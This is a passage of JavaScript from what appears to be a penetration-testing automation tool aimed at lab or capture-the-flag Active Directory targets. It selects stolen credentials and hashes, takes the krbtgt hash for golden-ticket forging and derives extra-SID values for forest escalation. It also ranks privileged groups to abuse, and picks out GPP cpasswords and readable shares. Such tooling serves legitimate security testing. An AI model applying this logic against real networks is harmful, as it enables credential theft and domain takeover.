        if (!ctx.domain && rankedCreds[c].domain) ctx.domain = rankedCreds[c].domain;
        break;
      }
    } else if (rankedCreds.length) {
      var c0 = rankedCreds[0];
      if (c0.user) ctx.user = c0.user;
      if ((c0.password || c0.secret) && !ctx.password) ctx.password = c0.password || c0.secret;
      var nh0 = c0.nthash || c0.hash;
      if (nh0 && !ctx.nthash) ctx.nthash = nh0;
      if (c0.domain && !ctx.domain) ctx.domain = c0.domain;
    }
    }
    if (!ctx.password && !ctx.nthash && !isExplicitAnon) {
      var ulSecrets = fvals('credential.password').concat(fvals('credential.available')).concat(fvals('credential.plaintext'));
      if (resolved && Array.isArray(resolved.allScopedFacts)) {
        resolved.allScopedFacts.forEach(function (sf) {
          if (sf && sf.state === 'supported' && /^credential\.(?:password|available|plaintext)$/.test(sf.kind) && sf.value) {
            ulSecrets.push(sf.value);
          }
        });
      }
      for (var uli = 0; uli < ulSecrets.length; uli++) {
        var ulv = ulSecrets[uli];
        if (!ulv || ulv.user || ulv.username) continue;
        var ulPw = ulv.password != null ? String(ulv.password) : (ulv.secret != null ? String(ulv.secret) : '');
        if (ulPw) {
          ctx.password = ulPw;
          break;
        }
      }
    }
    if (!ctx.user) {
      if (!isExplicitAnon && !ctx.password && !ctx.nthash) {
        var valUsers = [];
        if (!resolved) {
          fvals('credential.validated').forEach(function (vv) {
            var vu = vv && (vv.user || vv.username || vv.principal);
            if (vu) valUsers.push(String(vu).replace(/^.*\\/, '').split('@')[0].trim());
          });
        } else if (!resolved.credentialId && Array.isArray(resolved.allScopedFacts)) {
          resolved.allScopedFacts.forEach(function (af) {
            if (!af || af.state !== 'supported' || af.kind !== 'credential.validated' || !af.value) return;
            var av = af.value;
            if (av.password || av.secret || av.nthash || av.hash) return;
            var au = av.user || av.username || av.principal;
            if (au) valUsers.push(String(au).replace(/^.*\\/, '').split('@')[0].trim());
          });
        }
        fvals('db.session').forEach(function (dv) {
          var du = dv && (dv.user || dv.username || dv.principal);
          if (du) valUsers.push(String(du).replace(/^.*\\/, '').split('@')[0].trim());
        });
        for (var vui = 0; vui < valUsers.length; vui++) {
          if (valUsers[vui] && !/^(?:anonymous|guest)$/i.test(valUsers[vui])) {
            ctx.user = valUsers[vui];
            break;
          }
        }
      }
    }
    if (!ctx.user && !(resolved && resolved.credentialId && resolved.user) && !isExplicitAnon) {
      var fhList = fvals('foothold.linux').concat(fvals('foothold.windows'));
      for (var fi = 0; fi < fhList.length; fi++) {
        var fu = fhList[fi] && (fhList[fi].user || fhList[fi].identity || fhList[fi].username);
        if (fu) {
          var cleanFu = String(fu).replace(/^.*\\/, '').split('@')[0].trim();
          if (cleanFu && !ctx.password && !/^(?:www|www-data|apache|nginx|http|httpd|tomcat|irc|ircd|nobody|daemon|guest)$/i.test(cleanFu)) {
            ctx.user = cleanFu;
            break;
          }
        }
      }
      if (!ctx.user) {
        var huVals = fvals('host.users').concat(fvals('host.user')).concat(fvals('smtp.users'));
        for (var hui = 0; hui < huVals.length; hui++) {
          var huv = huVals[hui] || {};
          var uArr = Array.isArray(huv.users) ? huv.users : [huv.user || huv.username || huv.name || ''];
          for (var uai = 0; uai < uArr.length; uai++) {
            var uRaw = uArr[uai] && typeof uArr[uai] === 'object' ? (uArr[uai].user || uArr[uai].username || uArr[uai].name || '') : uArr[uai];
            var uClean = String(uRaw || '').replace(/^.*\\/, '').split('@')[0].trim();
            if (uClean && !/^(?:root|daemon|bin|sys|sync|games|man|lp|mail|news|uucp|proxy|www|www-data|apache|nginx|http|httpd|tomcat|backup|list|irc|ircd|gnats|nobody|systemd-[\w-]+|messagebus|sshd|tss|_[\w-]+|nt authority|system|local service|network service|defaultaccount|wdagutilityaccount|guest|krbtgt)$/i.test(uClean)) {
              ctx.user = uClean;
              break;
            }
          }
          if (ctx.user) break;
        }
      }
      if (!ctx.user) {
        var candVals = fvals('credential.candidate');
        for (var cdi = 0; cdi < candVals.length; cdi++) {
          var cdv = candVals[cdi] || {};
          var cdClean = String(cdv.user || cdv.username || '').replace(/^.*\\/, '').split('@')[0].trim();
          if (cdClean && !/^(?:anonymous|guest|unknown|user|username|<user>)$/i.test(cdClean)) {
            ctx.user = cdClean;
            break;
          }
        }
        if (!ctx.user) {
          for (var fi2 = 0; fi2 < fhList.length; fi2++) {
            var fu2 = fhList[fi2] && (fhList[fi2].user || fhList[fi2].identity || fhList[fi2].username);
            var cleanFu2 = fu2 ? String(fu2).replace(/^.*\\/, '').split('@')[0].trim() : '';
            if (cleanFu2) { ctx.user = cleanFu2; break; }
          }
        }
        var candVals = [];
        for (var cdi = 0; cdi < candVals.length; cdi++) {
          var cdv = candVals[cdi] || {};
          var cdClean = String(cdv.user || cdv.username || '').replace(/^.*\\/, '').split('@')[0].trim();
          if (cdClean && !/^(?:anonymous|guest|unknown|user|username|<user>)$/i.test(cdClean)) {
            ctx.user = cdClean;
            break;
          }
        }
      }
    }
    if (!ctx.user && opts && opts.action && (opts.action.id === 'asrep-roast' || opts.action.id === 'kerberoast')) {
      if (opts.action.id === 'kerberoast') {
        var asrepFacts = fvals('hash.asrep');
        for (var ari = 0; ari < asrepFacts.length; ari++) {
          var arv = asrepFacts[ari] || {};
          var arUser = arv.user || (Array.isArray(arv.users) && arv.users[0]) || '';
          if (!arUser) {
            var arHashes = Array.isArray(arv.hashes) ? arv.hashes : (arv.hash ? [arv.hash] : []);
            for (var ahi = 0; ahi < arHashes.length; ahi++) {
              var ahm = /\$krb5asrep\$(?:\d+\$)?([^$:@\s]+)(?:@[^$:\s]+)?[:$]/i.exec(String(arHashes[ahi] || ''));
              if (ahm && ahm[1]) { arUser = ahm[1]; break; }
            }
          }
          if (arUser) {
            ctx.user = String(arUser).replace(/^.*\\/, '').split('@')[0].trim();
            if (ctx.user) break;
          }
        }
      }
      if (!ctx.user) {
        var cands = fvals('credential.candidate');
        for (var ci = 0; ci < cands.length; ci++) {
          if (cands[ci] && (cands[ci].kind === 'asrep_roastable' || cands[ci].kind === 'asrep_hash') && cands[ci].user) {
            ctx.user = String(cands[ci].user).replace(/^.*\\/, '').split('@')[0].trim();
            if (ctx.user) break;
          }
        }
      }
      if (!ctx.user) {
        var uls = fvals('ad.user_list');
        for (var ui = 0; ui < uls.length; ui++) {
          if (uls[ui] && Array.isArray(uls[ui].asrep_users) && uls[ui].asrep_users.length) {
            ctx.user = String(uls[ui].asrep_users[0]).trim();
            break;
          }
        }
      }
    }

    // krbtgt key for golden-ticket forging - the DEDICATED krbtgt NT hash from a DCSync/NTDS dump, NEVER
    // the first credential's hash (forging with the wrong key silently produces an unusable ticket).
    if (!ctx.krbtgt_hash) {
      var kt = firstVal(facts, 'hash.krbtgt');
      if (kt && kt.nthash) ctx.krbtgt_hash = kt.nthash;
    }

    // Resolve admin hash aliases from the command's scoped material. A resolved
    // context contains only the selected credential, so these aliases never
    // silently switch away from the account the operator chose.
    if (!ctx.dahash) {
      var avs = fvals('credential.available');
      for (var ai = 0; ai < avs.length; ai++) {
        var v = avs[ai];
        if (v && v.method === 'dcsync' && (v.nthash || v.hash)) {
          ctx.dahash = v.nthash || v.hash;
          ctx.dauser = v.user || 'Administrator';
          if (!ctx.domain && v.domain) ctx.domain = v.domain;
          break;
        }
      }
      if (!ctx.dahash) {
        for (var ai2 = 0; ai2 < avs.length; ai2++) {
          var v2 = avs[ai2];
          if (v2 && (v2.nthash || v2.hash) && String(v2.user || '').toLowerCase() === 'administrator') {
            ctx.dahash = v2.nthash || v2.hash;
            ctx.dauser = v2.user || 'Administrator';
            if (!ctx.domain && v2.domain) ctx.domain = v2.domain;
            break;
          }
        }
      }
      if (!ctx.dahash && !(facts && facts._resolvedContext && facts._resolvedContext.credentialId)) {
        var ntFacts = fvals('hash.ntlm'), ntEntries = [];
        for (var ntf = 0; ntf < ntFacts.length; ntf++) {
          var fv = ntFacts[ntf] || {};
          if (Array.isArray(fv.entries)) {
            for (var nte = 0; nte < fv.entries.length; nte++) ntEntries.push(fv.entries[nte]);
          } else {
            ntEntries.push(fv);
          }
        }
        for (var nt = 0; nt < ntEntries.length; nt++) {
          var ntVal = ntEntries[nt] || {};
          var ntUser = String(ntVal.user || '');
          var isAdminNt = ntVal.rid === 500 || ntUser.toLowerCase() === 'administrator';
          if (!isAdminNt) continue;
          if ((ntVal.nt || ntVal.nthash || ntVal.hash)) {
            ctx.dahash = ntVal.nt || ntVal.nthash || ntVal.hash;
            ctx.dauser = ntUser || 'Administrator';
            if (!ctx.domain && ntVal.domain) ctx.domain = ntVal.domain;
            break;
          }
        }
      }
    }

    // ADCS ca/template/pfx
    var adcs = firstVal(facts, 'adcs.vulnerable');
    if (adcs) {
      var caVal = adcs.ca || (adcs.cas && adcs.cas[0]) || '';
      if (caVal && !ctx.ca_name) ctx.ca_name = caVal;
      var tmplVal = adcs.template || (adcs.templates && adcs.templates[0]) || '';
      if (tmplVal && !ctx.template) ctx.template = tmplVal;
    }
    var certs = fvals('credential.certificate');
    for (var ci = 0; ci < certs.length; ci++) {
      var pfxFile = certs[ci].pfx || (certs[ci].files && certs[ci].files[0]);
      if (pfxFile) { ctx.pfx = pfxFile; break; }
    }

    // DC identity
    if (!ctx.dc_netbios || !ctx.dc_account) {
      var dcName = '';
      var dcCands = fvals('ad.dc_candidate').concat(fvals('ad.dc_discovered'));
      for (var d = 0; d < dcCands.length; d++) {
        dcName = dcCands[d].name || dcCands[d].hostname || dcCands[d].netbios || dcCands[d].fqdn || '';
        if (dcName) break;
      }
      if (!dcName) {
        var hns = scopedValues(facts, 'host.hostname', tgt);
        for (var h = 0; h < hns.length; h++) { dcName = hns[h].name || hns[h].hostname || ''; if (dcName) break; }
      }
      if (dcName) {
        var short = String(dcName).replace(/\$$/, '').split('.')[0];
        if (!ctx.dc_netbios) ctx.dc_netbios = short;
        if (!ctx.dc_account) ctx.dc_account = short + '$';
      }
    }
    if (!ctx.hostname) {
      var hnList = fvals('host.hostname');
      for (var hi = 0; hi < hnList.length; hi++) {
        var hnVal = hnList[hi] && (hnList[hi].name || hnList[hi].hostname);
        if (hnVal) { ctx.hostname = hnVal; break; }
      }
      if (!ctx.hostname) {
        var dcList = fvals('ad.dc_candidate').concat(fvals('ad.dc_discovered'));
        for (var di = 0; di < dcList.length; di++) {
          var dcVal = dcList[di] && (dcList[di].name || dcList[di].hostname || dcList[di].netbios || dcList[di].fqdn);
          if (dcVal) { ctx.hostname = dcVal; break; }
        }
      }
    }
    if (!ctx.dc_fqdn) {
      var fqList = fvals('host.fqdn').concat(fvals('ad.dc_discovered')).concat(fvals('ad.dc_candidate'));
      for (var fqi = 0; fqi < fqList.length; fqi++) {
        var fqCand = fqList[fqi] && (fqList[fqi].fqdn || (fqList[fqi].hostname && fqList[fqi].hostname.indexOf('.') >= 0 ? fqList[fqi].hostname : ''));
        if (fqCand) { ctx.dc_fqdn = fqCand; break; }
      }
      if (!ctx.dc_fqdn && ctx.hostname && ctx.domain) {
        ctx.dc_fqdn = (ctx.hostname.indexOf('.') >= 0) ? ctx.hostname : (ctx.hostname + '.' + ctx.domain);
      }
    }

    // domain SID and cross-trust forest-root / extra-SID derivation
    var engAllFacts = ((resolved && resolved.engagement && resolved.engagement.facts) || (opts && opts.engagement && opts.engagement.facts) || []);
    var localFactArr = (facts && Array.isArray(facts.facts)) ? facts.facts : (Array.isArray(facts) ? facts : []);
    var combinedSidFacts = localFactArr.concat(engAllFacts);
    var curDomLower = String(ctx.domain || '').trim().toLowerCase().replace(/\.$/, '');
    var sids = fvals('ad.domain_sid');
    if (!ctx.domain_sid) {
      for (var s0 = 0; s0 < sids.length; s0++) {
        var sv0 = sids[s0] || {};
        var sd0 = String(sv0.domain || sv0.name || '').trim().toLowerCase().replace(/\.$/, '');
        if (sv0.sid && curDomLower && sd0 && sd0 === curDomLower) { ctx.domain_sid = String(sv0.sid).trim(); break; }
      }
      if (!ctx.domain_sid) {
        for (var s = 0; s < sids.length; s++) { if (sids[s] && sids[s].sid) { ctx.domain_sid = String(sids[s].sid).trim(); break; } }
      }
    }
    if (!ctx.forest_root_sid || !ctx.extra_sid) {
      var sidByDom = {};
      var hostDomMap = {};
      for (var hdi = 0; hdi < combinedSidFacts.length; hdi++) {
        var hdf = combinedSidFacts[hdi];
        if (!hdf || (hdf.state && hdf.state !== 'supported')) continue;
        var hdSc = String(hdf.scope || '');
        var hdv = hdf.value || {};
        if (/^host:/i.test(hdSc)) {
          var hdName = '';
          if ((hdf.kind === 'ad.domain_known' || hdf.kind === 'host.domain') && (hdv.domain || hdv.name)) hdName = String(hdv.domain || hdv.name);
          else if (hdf.kind === 'host.fqdn' && String(hdv.fqdn || hdv.name || '').indexOf('.') > 0) hdName = String(hdv.fqdn || hdv.name).split('.').slice(1).join('.');
          if (hdName) hostDomMap[hdSc.toLowerCase()] = hdName.trim().toLowerCase().replace(/\.$/, '');
        }
      }
      var otherSids = [];
      for (var csi = 0; csi < combinedSidFacts.length; csi++) {
        var csf = combinedSidFacts[csi];
        if (!csf || csf.kind !== 'ad.domain_sid' || (csf.state && csf.state !== 'supported')) continue;
        var csv = csf.value || {};
        var rawSid = String(csv.sid || '').trim().replace(/-519$/i, '');
        if (!/^S-1-5-21-\d+-\d+-\d+$/i.test(rawSid)) continue;
        var csSc = String(csf.scope || '');
        var csDom = String(csv.domain || csv.name || (/^domain:/i.test(csSc) ? csSc.slice(7) : (hostDomMap[csSc.toLowerCase()] || ''))).trim().toLowerCase().replace(/\.$/, '');
        if (csDom && !sidByDom[csDom]) sidByDom[csDom] = rawSid;
        if (!ctx.domain_sid || rawSid.toLowerCase() !== String(ctx.domain_sid).toLowerCase()) {
          otherSids.push({ domain: csDom, sid: rawSid });
        }
      }
      var foundRootSid = '';
      var candidateTrustDoms = [];
      var parentSuffix = (curDomLower && curDomLower.split('.').length >= 3) ? curDomLower.split('.').slice(1).join('.') : '';
      if (parentSuffix) candidateTrustDoms.push(parentSuffix);
      var hasTrustFact = false;
      for (var cti = 0; cti < combinedSidFacts.length; cti++) {
        var ctf = combinedSidFacts[cti];
        if (!ctf || ctf.kind !== 'ad.trusts' || (ctf.state && ctf.state !== 'supported')) continue;
        hasTrustFact = true;
        var tv = ctf.value || {};
        var directSid = String(tv.forest_root_sid || tv.parent_sid || tv.trusted_sid || tv.target_sid || '').trim().replace(/-519$/i, '');
        if (/^S-1-5-21-\d+-\d+-\d+$/i.test(directSid) && (!ctx.domain_sid || directSid.toLowerCase() !== String(ctx.domain_sid).toLowerCase())) {
          foundRootSid = directSid;
          break;
        }
        [tv.forest_root, tv.parent_domain, tv.trusted_domain, tv.target_domain].forEach(function (dn) {
          var cleanDn = String(dn || '').trim().toLowerCase().replace(/\.$/, '');
          if (cleanDn && cleanDn !== curDomLower && candidateTrustDoms.indexOf(cleanDn) < 0) candidateTrustDoms.push(cleanDn);
        });
        if (Array.isArray(tv.trusts)) {
          for (var tri = 0; tri < tv.trusts.length; tri++) {
            var tr = tv.trusts[tri] || {};
            var trDom = String(tr.target_domain || tr.TargetDomainName || tr.domain || tr.name || '').trim().toLowerCase().replace(/\.$/, '');
            var trSid = String(tr.target_sid || tr.DomainSid || tr.domain_sid || tr.sid || '').trim().replace(/-519$/i, '');
            if (trDom && trSid && /^S-1-5-21-\d+-\d+-\d+$/i.test(trSid) && !sidByDom[trDom]) sidByDom[trDom] = trSid;
            if (trDom && trDom !== curDomLower) {
              if (parentSuffix && trDom === parentSuffix) candidateTrustDoms.unshift(trDom);
              else if (candidateTrustDoms.indexOf(trDom) < 0) candidateTrustDoms.push(trDom);
            } else if (!trDom && /^S-1-5-21-\d+-\d+-\d+$/i.test(trSid) && (!ctx.domain_sid || trSid.toLowerCase() !== String(ctx.domain_sid).toLowerCase())) {
              foundRootSid = foundRootSid || trSid;
            }
          }
        }
        if (Array.isArray(tv.domains)) {
          tv.domains.forEach(function (dn2) {
            var cleanDn2 = String(dn2 || '').trim().toLowerCase().replace(/\.$/, '');
            if (cleanDn2 && cleanDn2 !== curDomLower) {
              if (parentSuffix && cleanDn2 === parentSuffix) candidateTrustDoms.unshift(cleanDn2);
              else if (candidateTrustDoms.indexOf(cleanDn2) < 0) candidateTrustDoms.push(cleanDn2);
            }
          });
        }
      }
      if (!foundRootSid) {
        for (var cdi = 0; cdi < candidateTrustDoms.length; cdi++) {
          var candDom = candidateTrustDoms[cdi];
          if (candDom && sidByDom[candDom] && (!ctx.domain_sid || sidByDom[candDom].toLowerCase() !== String(ctx.domain_sid).toLowerCase())) {
            foundRootSid = sidByDom[candDom];
            break;
          }
        }
      }
      if (!foundRootSid && hasTrustFact && otherSids.length === 1) {
        foundRootSid = otherSids[0].sid;
      }
      if (foundRootSid && !ctx.forest_root_sid) ctx.forest_root_sid = foundRootSid;
      if (ctx.forest_root_sid && !ctx.extra_sid) ctx.extra_sid = String(ctx.forest_root_sid).replace(/-519$/i, '') + '-519';
    }

    // BloodHound cash-in tokens from attack path hops (advancing past already-joined groups)
    var paths = fvals('ad.attack_paths');
    var joinedSet = {};
    var joinedByLower = {};
    var lastJoinedGroup = '';
    fvals('ad.group_joined').forEach(function (jv) {
      if (jv && jv.group) {
        var gClean = String(jv.group).split('@')[0].trim();
        if (gClean) {
          var gl = gClean.toLowerCase();
          joinedSet[gl] = 1;
          joinedByLower[gl] = gClean;
          lastJoinedGroup = gClean;
        }
      }
    });
    for (var p = 0; p < paths.length; p++) {
      var pHops = Array.isArray(paths[p].path) ? paths[p].path : [];
      var fa = paths[p].first_action || {};
      var faTgt = String(fa.target || '').split('@')[0].trim();
      var chosenGroup = '';
      var chosenSam = '';
      for (var hi = 0; hi < pHops.length; hi++) {
        var hop = pHops[hi];
        if (!hop || /^memberof$/i.test(String(hop.edge || ''))) continue;
        var hShort = String(hop.to || '').split('@')[0].trim();
        if (!hShort) continue;
        var isGrpHop = /group/i.test(String(hop.to_kind || '')) || /^add(?:member|self)$/i.test(String(hop.edge || ''));
        if (!isGrpHop && !hop.to_kind && !/^getchanges/i.test(String(hop.edge || ''))) {
          var domPart = String(hop.to || '').indexOf('@') >= 0 ? String(hop.to).split('@')[1].trim() : '';
          if ((!domPart || hShort.toLowerCase() !== domPart.toLowerCase()) && hShort.indexOf('.') < 0) isGrpHop = true;
        }
        if (isGrpHop) {
          if (!chosenGroup && !joinedSet[hShort.toLowerCase()]) chosenGroup = hShort;
          if (!chosenSam && !joinedSet[hShort.toLowerCase()]) chosenSam = hShort;
        } else if (!chosenSam) {
          chosenSam = hShort;
        }
      }
      if (!chosenGroup && faTgt && fa.kind !== 'domain' && (!ctx.domain || faTgt.toLowerCase() !== String(ctx.domain).toLowerCase())) {
        chosenGroup = faTgt;
      }
      if (!chosenSam && faTgt) chosenSam = faTgt;
      if (chosenGroup || chosenSam) {
        if (chosenGroup && !ctx.group) ctx.group = chosenGroup;
        if (chosenSam && !ctx.target_sam) ctx.target_sam = chosenSam;
        break;
      }
    }
    // ...and, when BloodHound wasn't run, from a bloodyAD `get writable` lead (ad.acl_lead). obol does NOT
    // guess which single group is the winner (that would hard-code one lab's path): it ranks the abusable
    // groups the lead actually shows and lets the operator try them until one unlocks with evidence.
    //   {{group}}                - the top-ranked candidate to try first (a starting point, not the answer)
    //   {{abuse_groups_quoted}}  - every reasonable candidate, quoted & space-joined, for a ONE-SHOT sweep
    //                              (`for g in {{abuse_groups_quoted}}; do add groupMember "$g" ...`)
    // Ranking is try-order only; whichever add actually sticks (and then unlocks DCSync) is the real path.
    if (ctx.group === undefined || ctx.target_sam === undefined || ctx.abuse_groups_quoted === undefined) {
      // The standard high-value AD groups, in the order worth trying: direct-DA first, then the groups
      // whose membership yields domain control (WriteDACL->DCSync, SeBackup, service install, DLL-on-DC).
      var ABUSE_PRIORITY = ['domain admins', 'enterprise admins', 'administrators',
        'exchange windows permissions', 'account operators', 'organization management',
        'backup operators', 'server operators', 'dnsadmins', 'print operators',
        'group policy creator owners', 'key admins', 'enterprise key admins'];
      var aclLeads = fvals('ad.acl_lead');
      var leadTargets = [];
      aclLeads.forEach(function (v) {
        (v.targets || []).forEach(function (tgt) { if (tgt && leadTargets.indexOf(tgt) < 0) leadTargets.push(tgt); });
      });
      var knownComputers = { 'the domain object': 1 };
      fvals('ad.computer_list').forEach(function (cv) {
        ((cv && cv.computers) || []).forEach(function (c) {
          var base = String(c || '').replace(/\$$/, '').split('.')[0].toLowerCase();
          if (base) knownComputers[base] = 1;
        });
      });
      if (ctx.dc_netbios) knownComputers[String(ctx.dc_netbios).toLowerCase()] = 1;
      if (ctx.hostname) knownComputers[String(ctx.hostname).split('.')[0].toLowerCase()] = 1;
      function _looksLikeComputerTarget(t) {
        var s = String(t || '').trim();
        if (!s) return true;
        var sl = s.toLowerCase();
        if (knownComputers[sl] || s.charAt(s.length - 1) === '$') return true;
        if (/^[A-Z0-9_-]+\d+$/.test(s) && s.indexOf(' ') < 0) return true;
        return false;
      }
      // Candidates = the reasonable, known-abusable groups the lead shows, in priority order, followed by
      // any custom domain groups discovered by `get writable` or BloodHound.
      var lowerSet = {};
      leadTargets.forEach(function (t) { lowerSet[String(t).toLowerCase()] = t; });
      var candidates = [], seenCand = {};
      function _pushCand(g) {
        var gl = String(g || '').toLowerCase();
        if (gl && !seenCand[gl]) { seenCand[gl] = 1; candidates.push(g); }
      }
      if (ctx.group && !joinedSet[String(ctx.group).toLowerCase()]) _pushCand(ctx.group);
      ABUSE_PRIORITY.forEach(function (g) { if (lowerSet[g] && !joinedSet[g]) _pushCand(lowerSet[g]); });
      leadTargets.forEach(function (t) {
        var tl = String(t || '').toLowerCase();
        if (!seenCand[tl] && !joinedSet[tl] && !_looksLikeComputerTarget(t)) _pushCand(t);
      });
      if (!candidates.length && aclLeads.length) {
        candidates = ABUSE_PRIORITY.map(function (g) { return g.replace(/\b\w/g, function (c) { return c.toUpperCase(); }); });
      }
      if (ctx.group === undefined && leadTargets.length) ctx.group = candidates[0] || leadTargets[0] || '';
      if (ctx.target_sam === undefined && leadTargets.length) ctx.target_sam = candidates[0] || leadTargets[0] || '';
      if (ctx.abuse_groups_quoted === undefined && candidates.length) {
        ctx.abuse_groups_quoted = candidates.map(function (g) { return '"' + String(g).replace(/(["\\$`])/g, '\\$1') + '"'; }).join(' ');
      }
    }
    if (ctx.joined_group === undefined) {
      var bestJoined = '';
      var JOINED_PRIORITY = ['domain admins', 'enterprise admins', 'administrators',
        'exchange windows permissions', 'account operators', 'organization management',
        'backup operators', 'server operators', 'dnsadmins', 'print operators',
        'group policy creator owners', 'key admins', 'enterprise key admins'];
      for (var jpi = 0; jpi < JOINED_PRIORITY.length; jpi++) {
        if (joinedByLower[JOINED_PRIORITY[jpi]]) {
          bestJoined = joinedByLower[JOINED_PRIORITY[jpi]];
          break;
        }
      }
      ctx.joined_group = bestJoined || lastJoinedGroup || ctx.group || 'Exchange Windows Permissions';
    }

    // flag-hunt tokens from the engagement profile (which flag names the hunt searches)
    var fc = (OBOL.profile && OBOL.profile.resolveFlagConfig)
      ? OBOL.profile.resolveFlagConfig(opts.profile || {})
      : { names: ['local.txt', 'user.txt', 'proof.txt', 'root.txt'], slots: { 'local.txt': 'local', 'user.txt': 'local', 'proof.txt': 'root', 'root.txt': 'root' } };
    if (!ctx.flag_inames_linux && OBOL.profile && OBOL.profile.linuxInameExpr) ctx.flag_inames_linux = OBOL.profile.linuxInameExpr(fc.names);
    if (!ctx.flag_names_windows && OBOL.profile && OBOL.profile.windowsNameList) ctx.flag_names_windows = OBOL.profile.windowsNameList(fc.names);

      // Per-slot flag file PATHS for the on-host capture step. Prefer a path obol actually LOCATED (a
      // nxc/smb spider, or a prior read) so step 3/4 fill with the real file, the user's Desktop, the
      // platform's own name, instead of a guessed placeholder; else a profile-aware default.
      var _flagName = function (slot) {
        var ns = fc.names || [];
        for (var i = 0; i < ns.length; i++) if ((fc.slots || {})[ns[i]] === slot) return ns[i];
        return slot === 'root' ? 'root.txt' : 'user.txt';
      };
      var _locatedPath = function (slot) {
        var kinds = [
          'objective.flag_located',
          slot === 'root' ? 'objective.root_flag' : 'objective.local_flag',
          slot === 'root' ? 'objective.flag_located_root' : 'objective.flag_located_local'
        ];
        for (var k = 0; k < kinds.length; k++) {
          var vs = scopedValues(facts, kinds[k], tgt);
          var candidates = [];
          for (var i = 0; i < vs.length; i++) {
            var v = vs[i];
            if (!v) continue;
            var p = '';
            if (typeof v === 'string') {
              p = v;
            } else if (typeof v === 'object') {
              if (v.slot && v.slot !== slot && v.slot !== (slot === 'local' ? 'user' : 'root')) continue;
              p = String(v.path || v.file || v.value || '');
            }
            if (!p) continue;
            if (/\.lnk$/i.test(p) || /[\\/](?:Recent|AppData|Temp)[\\/]/i.test(p)) continue;
            candidates.push(p);
          }
          if (candidates.length) {
            for (var c = 0; c < candidates.length; c++) {
              if (/[\\/]Desktop[\\/]/i.test(candidates[c])) return candidates[c];
            }
            return candidates[0];
          }
        }
        return '';
      };
      var _isLinux = facts && facts.has && (facts.has('foothold.linux') || facts.has('access.shell') || facts.has('os.linux'))
        && !facts.has('foothold.windows') && !facts.has('os.windows');
      var _priv = function (u) {
        var s = String(u || '').toLowerCase();
        return !s || /^(?:administrator|admin|root|system|nt authority\\system|guest|defaultaccount|krbtgt|www-data|apache|nginx|nobody|daemon|http|postgres|mysql|redis|tomcat|iis apppool|network service|local service)$/.test(s) || /^svc[-_]/i.test(s) || /\$$/.test(s);
      };
      // Both flag_path_local (plus flag_smb_path_local) and flag_path_root are earned gate tokens:
      // only populated once objective.flag_located has confirmed the exact file path on the target.
      if (ctx.flag_path_local === undefined) {
        var _locL = _locatedPath('local');
        if (_locL) {
          ctx.flag_path_local = _locL;
        }
      }
      if (ctx.flag_path_local) {
        var _baseL = String(ctx.flag_path_local).split(/[\\/]/).pop();
        if (_baseL && !ctx.flag_name_local) ctx.flag_name_local = _baseL;
        if (ctx.flag_smb_path_local === undefined) {
          var _smbRel = String(ctx.flag_path_local)
            .replace(/^(?:[A-Za-z]:[\\/]+Users[\\/]+|(?:\/\/|\\\\)[^/\\]+[/\\]+Users[/\\]+)/i, '')
            .replace(/\\+/g, '/');
          if (_smbRel) ctx.flag_smb_path_local = _smbRel;
        }
      }
      if (!ctx.flag_name_local) {
        ctx.flag_name_local = _flagName('local');
      }
      if (ctx.flag_path_root === undefined) {
        var _locR = _locatedPath('root');
        if (_locR) {
          ctx.flag_path_root = _locR;
        }
      }
      if (ctx.flag_path_root) {
        var _baseR = String(ctx.flag_path_root).split(/[\\/]/).pop();
        if (_baseR && !ctx.flag_name_root) ctx.flag_name_root = _baseR;
      }
      if (!ctx.flag_name_root) {
        ctx.flag_name_root = _flagName('root');
      }

    // SMB share tokens: resolve the top-ranked readable share from discovered shares (smb.shares / smb.readable_share)
    // Priority order:
    //   1. Custom non-default shares (e.g. Replication, Backups, Shared, Public, Data)
    //   2. Domain policy shares (SYSVOL, NETLOGON)
    //   3. Administrative shares (C$)
    // Exclude transport noise: IPC$, PRINT$
    if (!ctx.share) {
      var allShares = [];
      fvals('smb.shares').forEach(function (v) {
        ((v && v.shares) || []).forEach(function (s) {
          var sObj = typeof s === 'string' ? { name: s } : s;
          if (sObj && (sObj.name || sObj.share)) allShares.push(Object.assign({}, sObj, { name: sObj.name || sObj.share }));
        });
      });
      fvals('smb.readable_share').forEach(function (s) {
        var sName = typeof s === 'string' ? s : (s && (s.name || s.share));
        if (sName && !allShares.some(function (x) { return x.name.toUpperCase() === String(sName).toUpperCase(); })) {
          allShares.push(Object.assign({ readable: true }, typeof s === 'object' ? s : {}, { name: String(sName) }));
        }
      });
      var BOILERPLATE = { 'IPC$': 1, 'PRINT$': 1 };
      var readableList = allShares.filter(function (s) {
        var n = (s.name || '').toUpperCase();
        var isAdminShare = (n === 'ADMIN$' || n === 'C$');
        return (s.readable === true || (!s.permission && !isAdminShare) || (s.permission && s.permission.indexOf('READ') >= 0)) && !BOILERPLATE[n];
      });
      var customList = readableList.filter(function (s) {
        var n = (s.name || '').toUpperCase();
        return ['SYSVOL', 'NETLOGON', 'ADMIN$', 'C$'].indexOf(n) < 0;
      });
      var policyList = readableList.filter(function (s) {
        var n = (s.name || '').toUpperCase();
        return n === 'SYSVOL' || n === 'NETLOGON';
      });
      var adminList = readableList.filter(function (s) {
        var n = (s.name || '').toUpperCase();
        return n === 'C$';
      });

      var chosen = (customList[0] || policyList[0] || adminList[0] || readableList[0] || {});
      if (chosen.name) ctx.share = chosen.name;
      else if (params && params.share) ctx.share = params.share;

      var candidateNames = customList.concat(policyList).map(function (s) { return s.name; });
      if (candidateNames.length) {
        ctx.shares_readable_quoted = candidateNames.map(function (n) { return '"' + String(n).replace(/(["\\$`])/g, '\\$1') + '"'; }).join(' ');
      }
    }

    // cpassword from GPP hunting facts (credential.candidate with kind: 'gpp_cpassword' or ad.gpp_cpassword)
    if (!ctx.cpassword) {
      var gppCandidates = fvals('credential.candidate').concat(fvals('ad.gpp_cpassword'));
      for (var gc = 0; gc < gppCandidates.length; gc++) {
        var gVal = gppCandidates[gc];
        if (typeof gVal === 'string' && gVal.trim()) {
          ctx.cpassword = gVal.trim();
          break;
        }
        if (gVal && typeof gVal === 'object' && (!gVal.kind || gVal.kind === 'gpp_cpassword')) {
          var gPick = (Array.isArray(gVal.values) && gVal.values[0]) || gVal.cpassword || gVal.secret || gVal.value || '';
          if (gPick) {
            ctx.cpassword = String(gPick);
            break;
          }
        }
      }
    }

    // Pivot, subnet, neighbor, resolver, and listener tokens from local-pivot / listener facts
    var subCandidates = fvals('pivot.candidate').concat(fvals('scan.local.routes')).concat(fvals('scan.local.interfaces')).concat(fvals('network.subnet_candidate'));
    var routeVals = fvals('host.route');
